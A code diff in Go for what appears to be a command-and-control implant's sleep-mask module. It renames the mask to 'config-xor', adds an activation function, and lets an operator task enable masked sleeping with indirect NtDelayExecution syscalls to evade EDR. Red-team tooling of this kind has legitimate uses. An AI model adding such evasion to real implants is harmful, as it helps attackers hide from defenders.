@@ -19,11 +19,6 @@ var (
 	activeSleepMask SleepMasker
 	maskRegistry    = map[string]func() SleepMasker{}
 	sleepObfFunc    func(uintptr)
-	// fullImageMaskActive tracks whether the ACTIVE mask is the advanced
-	// full-image implementation as opposed to the config-buffer-only mask, so
-	// Name() can report the honest capability. The full-image factory itself
-	// and the mask registration hook are windows-only (sleepmask_windows.go).
-	fullImageMaskActive bool
 )
 
 type basicMask struct{}
@@ -46,15 +41,11 @@ func (m *basicMask) BeforeSleep(durationMs uintptr) {
 
 func (m *basicMask) AfterWake() {}
 
-// Name is honest about capability: full-image ekko requires the advanced
-// windows factory to be active; everywhere else the mask only obfuscates the
-// in-memory config buffer, so it is reported as "config-xor" rather than a lie.
-func (m *basicMask) Name() string {
-	if fullImageMaskActive {
-		return "ekko"
-	}
-	return "config-xor"
-}
+// Name is honest about capability: the Go agent carries no full-image mask,
+// only the config-buffer obfuscation pass (with the sleep itself routed
+// through an indirect NtDelayExecution syscall on Windows), so the mask
+// reports "config-xor" rather than a lie.
+func (m *basicMask) Name() string { return "config-xor" }
 
 type xorOnlyMask struct{}
 
@@ -79,7 +70,7 @@ func (m *xorOnlyMask) AfterWake() {}
 func (m *xorOnlyMask) Name() string { return "xor" }
 
 func init() {
-	maskRegistry["ekko"] = func() SleepMasker { return &basicMask{} }
+	maskRegistry["config-xor"] = func() SleepMasker { return &basicMask{} }
 	maskRegistry["xor"] = func() SleepMasker { return &xorOnlyMask{} }
 	activeSleepMask = &basicMask{}
 }
@@ -92,6 +83,14 @@ func getRegisteredMasks() []string {
 	return names
 }
 
+// activateSleepMask turns masked sleeping on: sleepWithJitter routes the wait
+// through the active SleepMasker instead of a plain sleep. Called when the EDR
+// strategy opts in (enableSleepMask on Windows) or when an operator explicitly
+// switches a mask via the set_sleep_mask task.
+func activateSleepMask() {
+	sleepMaskActive = true
+}
+
 func setActiveSleepMask(technique string) bool {
 	factory, ok := maskRegistry[technique]
 	if !ok {
@@ -102,9 +101,6 @@ func setActiveSleepMask(technique string) bool {
 		return false
 	}
 	activeSleepMask = m
-	// An explicit operator switch selects the registry masks (config-buffer or
-	// xor); none of them is the full-image implementation.
-	fullImageMaskActive = false
 	return true
 }
 
@@ -148,5 +144,10 @@ func handleSetSleepMask(task Task, res *TaskResult) {
 		res.Output = string(b)
 		return
 	}
-	res.Output = "sleep mask switched to: " + params.Technique
+	// Make sure the platform infrastructure is ready even when the EDR
+	// strategy did not opt in (e.g. a non-EDR host): an explicit operator
+	// switch should engage the full mask, not only the indirect sleep.
+	InitSleepMask()
+	activateSleepMask()
+	res.Output = "sleep mask switched to: " + params.Technique + " (masked sleeping enabled)"
 }
